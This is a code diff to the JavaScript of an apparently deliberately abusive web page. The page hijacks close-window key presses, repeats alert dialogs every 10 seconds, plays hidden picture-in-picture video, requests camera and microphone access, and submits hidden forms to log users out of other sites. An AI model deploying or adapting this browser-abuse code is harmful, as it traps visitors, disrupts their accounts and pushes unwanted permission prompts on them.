@@ -212,7 +212,7 @@ function init () {
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
-      showModal()
+      window.print()
     } else {
       if (isParentWindow && Math.random() < 0.20) requestFullscreen()
       else requestCameraAndMic()
@@ -425,7 +425,6 @@ function interceptUserInput (onInput) {
 function startInvisiblePictureInPictureVideo () {
   const video = document.createElement('video')
   video.src = getRandomArrayEntry(VIDEOS)
-  video.autoplay = true
   video.loop = true
   video.muted = true
   video.style = HIDDEN_STYLE
@@ -441,11 +440,9 @@ function startInvisiblePictureInPictureVideo () {
  */
 function enablePictureInPicture () {
   const video = document.querySelector('video')
-  if (video.webkitSetPresentationMode) {
   if (document.pictureInPictureEnabled) {
     video.style = ''
     video.muted = false
-    video.webkitSetPresentationMode('picture-in-picture')
     video.requestPictureInPicture()
     video.play()
   }
@@ -636,25 +633,14 @@ function clipboardCopy (text) {
 }
 
 /**
- * Show an alert dialog at a regular interval
- */
-function startAlertInterval () {
-  setInterval(() => {
-    showModal()
-  }, 30000)
-}
-
-/**
- * Show a modal dialog. Modals capture focus from other OS apps and browser tabs.
+ * Show a modal dialog at a regular interval. Modals capture focus from other OS apps and browser tabs.
  * Except in Chrome 64+, where modals can only capture focus from other OS apps,
  * but not from other tabs.
  */
-function showModal () {
-  if (Math.random() < 0.5) {
+function startAlertInterval () {
+  setInterval(() => {
     showAlert()
-  } else {
-    window.print()
-  }
+  }, 10000)
 }
 
 /**
@@ -721,7 +707,7 @@ function superLogout () {
     form.target = iframe.name
 
     for (const param in params) {
-      if (params.hasOwnProperty(param)) {
+      if (Object.prototype.hasOwnProperty.call(params, param)) {
         const input = document.createElement('input')
         input.type = 'hidden'
         input.name = param
